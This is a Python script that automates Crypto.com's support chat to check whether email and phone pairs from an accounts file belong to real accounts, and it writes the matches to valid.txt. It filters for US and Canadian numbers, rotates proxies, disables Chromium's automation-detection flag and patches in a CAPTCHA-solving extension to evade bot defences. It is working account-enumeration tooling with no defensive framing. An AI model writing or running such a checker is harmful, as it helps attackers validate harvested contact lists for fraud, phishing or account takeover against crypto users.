import random
import toml
import phonenumbers
import pycountry
import requests
import asyncio
import zipfile
import os
import tempfile
import re
import shutil

from enum import Enum
from functools import wraps
from logmagix import Logger, Home
from phonenumbers import geocoder
from patchright.async_api import async_playwright
from pathlib import Path

config_path = Path(__file__).parent.parent / 'input' / 'config.toml'
with open(config_path) as f:
    config = toml.load(f)

DEBUG = config['dev'].get('Debug', False)

log = Logger(log_file="logs/output.log" if DEBUG else None)

def debug(func_or_message, *args, **kwargs):
    if callable(func_or_message):
        if asyncio.iscoroutinefunction(func_or_message):
            @wraps(func_or_message)
            async def async_wrapper(*args, **kwargs):
                result = await func_or_message(*args, **kwargs)
                if DEBUG:
                    log.debug(f"{func_or_message.__name__} returned: {result}")
                return result
            return async_wrapper
        else:
            @wraps(func_or_message)
            def wrapper(*args, **kwargs):
                result = func_or_message(*args, **kwargs)
                if DEBUG:
                    log.debug(f"{func_or_message.__name__} returned: {result}")
                return result
            return wrapper
    else:
        if DEBUG:
            log.debug(f"Debug: {func_or_message}")

class Status(Enum):
    INVALID = 0
    VALID = 1
    ERROR = 2

class Miscellaneous:
    @debug
    def get_proxies(self) -> dict:
        try:
            if config['dev'].get('Proxyless', False):
                debug("Running in proxyless mode")
                return None
                
            proxies_path = Path(__file__).parent.parent / 'input' / 'proxies.txt'
            with open(proxies_path) as f:
                proxies = [line.strip() for line in f if line.strip()]
                debug(f"Loaded proxies: {len(proxies)} proxies")
                if not proxies:
                    log.warning("No proxies available. Running in proxyless mode.")
                    return None
                
                proxy_choice = random.choice(proxies)
                debug(f"Selected proxy: {proxy_choice}")
                proxy_parts = proxy_choice.split(':')
                if len(proxy_parts) == 4:
                    ip, port, user, passw = proxy_parts
                    proxy_dict = {
                        'server': f'http://{ip}:{port}',
                        'username': user,
                        'password': passw
                    }
                    debug(f"Proxy configured: {proxy_dict}")
                    return proxy_dict
                else:
                    proxy_dict = {
                        'server': f'http://{proxy_choice}'
                    }
                    debug(f"Proxy configured: {proxy_dict}")
                    return proxy_dict

        except FileNotFoundError:
            log.failure("Proxy file not found. Running in proxyless mode.")
            return None

    @debug
    def get_phone_region(self, number: str, lang: str = "en"):
        debug(f"Parsing phone number: {number}")
        try:
            if isinstance(number, (set, list, tuple)):
                number = next(iter(number)) if number else ""
                debug(f"Converted number to string: {number}")

            parsed_number = phonenumbers.parse(number, None)
            debug(f"Parsed number: {parsed_number}")
            region = geocoder.description_for_number(parsed_number, lang)
            country_code = phonenumbers.region_code_for_number(parsed_number)
            country = pycountry.countries.get(alpha_2=country_code).name if country_code else None

            formatted = f"+{parsed_number.country_code} {parsed_number.national_number}"
            debug(f"Formatted number: {formatted}")

            result = {
                "valid": phonenumbers.is_valid_number(parsed_number),
                "country_code": country_code,
                "region": region,
                "country": country,
                "formatted": formatted
            }
            debug(f"Phone region result: {result}")
            return result
        except Exception as e:
            debug(f"Error parsing phone: {e}")
            return {"error": str(e)}

    @debug
    def parse_account_line(self, line: str):
        debug(f"Parsing account line: {line}")
        if ',' in line:
            debug("Detected CSV format")
            parts = line.split(',')
            if len(parts) >= 2:
                email = parts[-1].strip()
                phone = parts[-2].strip()
                debug(f"CSV parsed email: {email}, phone: {phone}")
            else:
                debug("CSV format but not enough parts")
                return None, None
        else:
            debug("Detected colon format")
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    phone = parts[1].strip()
                    debug(f"Colon parsed email: {email}, phone: {phone}")
                else:
                    debug("Colon format but not split properly")
                    return None, None
            else:
                debug("No separator found")
                return None, None
        
        # Ensure phone starts with '+'
        if phone and not phone.startswith("+"):
            phone = f"+{phone}"
            debug(f"Added + to phone: {phone}")
        
        debug(f"Final parsed email: {email}, phone: {phone}")
        return email, phone

class Browser:
    def __init__(self, misc: Miscellaneous):
        self.extension_path = self.setup_extension()
        debug(f"Extension path: {self.extension_path}")
        self.browser_args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-background-networking",
            "--disable-background-timer-throttling",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
           # "--window-position=2000,2000",
            f"--load-extension={self.extension_path}",
        ]
        self.misc = misc
        self.selectors = {
            'main': '#alfredBody > div > div > div.home-panel_content > div.home-btn.send-btn',
            'english': '#conversationBody > div.messages > div.action-div > button:nth-child(1)',
            'security': '#conversationBody > div.messages > div.action-div > button:nth-child(1)',
            'phone updates': '#conversationBody > div.messages > div.action-div > button:nth-child(4)',
            'yes it is': '#conversationBody > div.messages > div.action-div > button:nth-child(1)',
            'need further assistance': '#conversationBody > div.messages > div.action-div > button:nth-child(2)',
            'phone input': '#van-field-2-input',
            'email input': '#van-field-3-input',
            'submit': '#conversationMessages > div.phone-number-confirm-message > button.phone-number-confirm-message_button'
        }

    @debug
    def setup_extension(self):
        extension_dir = Path(tempfile.gettempdir()) / 'capsolver_extension'
        debug(f"Checking extension dir: {extension_dir}")
        if not extension_dir.exists():
            log.info("Downloading Capsolver extension...")
            debug("Starting download")
            zip_url = "https://github.com/capsolver/capsolver-browser-extension/releases/latest/download/CapSolver.Browser.Extension-chrome.zip"
            response = requests.get(zip_url)
            if response.status_code == 200:
                debug("Download successful, saving ZIP")
                zip_path = Path(tempfile.gettempdir()) / 'capsolver-extension.zip'
                with open(zip_path, 'wb') as f:
                    f.write(response.content)
                debug("Extracting ZIP")
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(extension_dir)
                zip_path.unlink()
                debug("Extraction complete")
                log.success("Capsolver extension downloaded and extracted.")
            else:
                log.failure("Failed to download Capsolver extension.")
                return ""
        
        # Set API key and enable features in config.js (always, even if already downloaded)
        config_js_path = extension_dir / 'config.js'
        if not config_js_path.exists():
            config_js_path = extension_dir / 'assets' / 'config.js'
        if config_js_path.exists():
            with open(config_js_path, 'r', encoding='utf-8') as f:
                content = f.read()
            debug(f"Original config content: {content[:300]}...")
            # Replace apiKey
            content = re.sub(r"apiKey:\s*['\"](.*?)['\"]", f"apiKey: '{config['captcha']['api_key']}'", content)
            debug(f"Modified config content: {content[:300]}...")
            # Set modes
            with open(config_js_path, 'w', encoding='utf-8') as f:
                f.write(content)
            debug(f"API key and settings set in extension config.js at {config_js_path}")
            log.info("Capsolver extension configured automatically.")
        else:
            log.warning("config.js not found in extension.")
        
        # Update apiKey in all JS files
        for root, dirs, files in os.walk(extension_dir):
            for file in files:
                if file.endswith('.js'):
                    js_path = Path(root) / file
                    try:
                        with open(js_path, 'r', encoding='utf-8') as f:
                            js_content = f.read()
                        if 'apiKey' in js_content:
                            original = js_content
                            js_content = re.sub(r"apiKey:\s*['\"](.*?)['\"]", f"apiKey: '{config['captcha']['api_key']}'", js_content)
                            if js_content != original:
                                with open(js_path, 'w', encoding='utf-8') as f:
                                    f.write(js_content)
                                debug(f"Updated apiKey in {js_path}")
                    except Exception as e:
                        debug(f"Error updating {js_path}: {e}")
        
        debug(f"API key updated in extension files")

        # Inject a small script into the extension popup to write the API key into chrome.storage/localStorage
        popup_html = extension_dir / 'www' / 'index.html'
        try:
            if popup_html.exists():
                with open(popup_html, 'r', encoding='utf-8') as f:
                    html = f.read()

                marker = '<!-- AUTO-INJECT-CAPSolver-API -->'
                if marker not in html:
                    api = config['captcha']['api_key']
                    inject = (
                        f"{marker}\n"
                        "<script>\n"
                        "(function(){\n"
                        "  try{\n"
                        "    var cfg = { apiKey: '" + api + "' };\n"
                        "    try{ if(chrome && chrome.storage && chrome.storage.local){ chrome.storage.local.set({capsolver_config: cfg}); } }catch(e){}\n"
                        "    try{ localStorage.setItem('capsolver_config', JSON.stringify(cfg)); }catch(e){}\n"
                        "  }catch(e){}\n"
                        "})();\n"
                        "</script>\n"
                    )
                    # Insert before the main module script tag
                    html = html.replace('<script type="module"', inject + '<script type="module"')
                    with open(popup_html, 'w', encoding='utf-8') as f:
                        f.write(html)
                    debug(f"Injected API key into popup HTML at {popup_html}")
                else:
                    debug("Popup HTML already contains injection marker")
        except Exception as e:
            debug(f"Failed to inject popup script: {e}")
        
        # Find the manifest
        manifest_path = None
        debug("Searching for manifest.json")
        for root, dirs, files in os.walk(extension_dir):
            if 'manifest.json' in files:
                manifest_path = Path(root) / 'manifest.json'
                break
        if manifest_path:
            extension_dir = manifest_path.parent
            debug(f"Manifest found, extension dir: {extension_dir}")
            log.info(f"Extension directory set to: {extension_dir}")
        else:
            log.failure("Manifest.json not found in extracted extension.")
            return ""
        
        return extension_dir

    @debug
    async def check_account(self, email: str, phone: str):
        debug(f"Starting check for {email}")
        proxy = self.misc.get_proxies()
        debug(f"Proxy: {proxy}")
        user_data_dir = Path(tempfile.gettempdir()) / 'crypto_checker_browser_data'
        if user_data_dir.exists():
            shutil.rmtree(user_data_dir)
        user_data_dir.mkdir(exist_ok=True)
        debug(f"User data dir: {user_data_dir}")
        async with async_playwright() as p:
            debug("Launching persistent context")
            context = await p.chromium.launch_persistent_context(
                str(user_data_dir),
                args=self.browser_args,
                proxy=proxy,
                headless=False
            )

            page = await context.new_page()
            debug("New page created")
            
            try:
                debug("Going to chat.crypto.com")
                await page.goto('https://chat.crypto.com/')
                await page.wait_for_load_state('networkidle')
                debug("Page loaded")
                
                # Start chat
                debug("Waiting for main selector")
                await page.wait_for_selector(self.selectors['main'])
                await page.click(self.selectors['main'])
                debug("Clicked main")
                
                # Select English
                debug("Waiting for english selector")
                await page.wait_for_selector(self.selectors['english'])
                await page.click(self.selectors['english'])
                debug("Clicked english")
                
                # Select security
                debug("Waiting for security selector")
                await page.wait_for_selector(self.selectors['security'])
                await page.click(self.selectors['security'])
                debug("Clicked security")
                
                # Select phone updates
                debug("Waiting for phone updates selector")
                await page.wait_for_selector(self.selectors['phone updates'])
                await page.click(self.selectors['phone updates'])
                debug("Clicked phone updates")
                
                # Yes it is
                debug("Waiting for yes it is selector")
                await page.wait_for_selector(self.selectors['yes it is'])
                await page.click(self.selectors['yes it is'])
                debug("Clicked yes it is")
                
                # Need further assistance
                debug("Waiting for need further assistance selector")
                await page.wait_for_selector(self.selectors['need further assistance'])
                await page.click(self.selectors['need further assistance'])
                debug("Clicked need further assistance")
                
                # Fill phone and email
                debug("Waiting for phone input")
                await page.wait_for_selector(self.selectors['phone input'])
                await page.fill(self.selectors['phone input'], phone)
                debug("Filled phone")
                
                debug("Waiting for email input")
                await page.wait_for_selector(self.selectors['email input'])
                await page.fill(self.selectors['email input'], email)
                debug("Filled email")
                
                # Submit
                debug("Waiting for submit selector")
                await page.wait_for_selector(self.selectors['submit'])
                await page.click(self.selectors['submit'])
                debug("Clicked submit")
                
                # Wait for response
                debug("Waiting for response")
                await page.wait_for_selector('#conversationBody')
                content = await page.text_content('#conversationBody')
                debug(f"Response content: {content[:100]}...")
                
                if "Thank you for" in content:
                    valid_path = Path(__file__).parent.parent / 'output' / 'valid.txt'
                    with open(valid_path, "a", encoding='utf-8') as f:
                        f.write(f"{email}:{phone}\n")
                    log.success(f"Valid account: {email[:12]}...")
                    debug("Account valid")
                    return Status.VALID
                else:
                    invalid_path = Path(__file__).parent.parent / 'output' / 'invalid.txt'
                    with open(invalid_path, "a", encoding='utf-8') as f:
                        f.write(f"{email}:{phone}\n")
                    log.failure(f"Invalid account: {email[:12]}...", level="INVALID")
                    debug("Account invalid")
                    return Status.INVALID
                    
            except Exception as e:
                log.failure(f"Error: {e}")
                debug(f"Exception: {e}")
                return Status.ERROR
            finally:
                debug("Closing context")
                await context.close()

@debug
async def main():
    debug("Starting main function")
    misc = Miscellaneous()
    debug("Miscellaneous instance created")
    browser = Browser(misc)
    debug("Browser instance created")
    
    # Read accounts
    debug("Reading accounts file")
    accounts_path = Path(__file__).parent.parent / 'input' / 'accounts.txt'
    with open(accounts_path, 'r', encoding='utf-8') as f:
        accounts = f.readlines()
    debug(f"Read {len(accounts)} accounts")
    
    for account_line in accounts:
        debug(f"Processing account line: {account_line.strip()}")
        email, phone = misc.parse_account_line(account_line.strip())
        if not email or not phone:
            debug("Skipping malformed account line")
            continue
        debug(f"Parsed email: {email}, phone: {phone}")
        region_data = misc.get_phone_region(phone)
        debug(f"Phone region data: {region_data}")
        country = region_data.get("country")
        debug(f"Country: {country}")
        
        if country not in ['United States', 'Canada']:
            debug("Skipping non-US/CA account")
            continue
        
        debug("Checking account")
        status = await browser.check_account(email, phone)
        debug(f"Account check result: {status}")
        
        # No delay between checks for faster testing

if __name__ == "__main__":
    asyncio.run(main())

# Need to fix the fact that it is not solving upon loading